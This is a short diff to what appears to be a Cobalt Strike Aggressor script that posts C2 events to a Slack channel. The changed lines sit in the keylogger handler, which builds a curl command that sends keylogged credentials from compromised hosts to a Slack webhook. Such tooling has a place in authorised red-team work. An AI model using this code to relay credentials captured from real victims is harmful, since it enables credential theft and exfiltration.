@@ -1,4 +1,4 @@
-# Based on the work of @ bluescreenofjeff
+# Author @sec_groundzero. Based on the work of @ bluescreenofjeff
 
 $slack_channel = "#XXXXXX";
 $slack_emoji = ':skeleton:';
@@ -39,9 +39,8 @@ on event_public {
 
 on keylogger_hit {
 
-		@curl_command = @('curl','-X','POST','payload={"username": "Cobalt Strike Bot", "icon_emoji": "' . $slack_emoji. '", "channel": "' . $slack_channel . '", "text":"Creds from ' . $1 . '. : ' . $3 .'"}',$slack_webhookURL);
+		@curl_command = @('curl','-X','POST','--data-urlencode','payload={"username": "Cobalt Strike Bot", "icon_emoji": "' . $slack_emoji. '", "channel": "' . $slack_channel . '", "text":"Keylog creds from ' . $2 . '"}',$slack_webhookURL);
 		exec(@curl_command);
-
 
 
 }
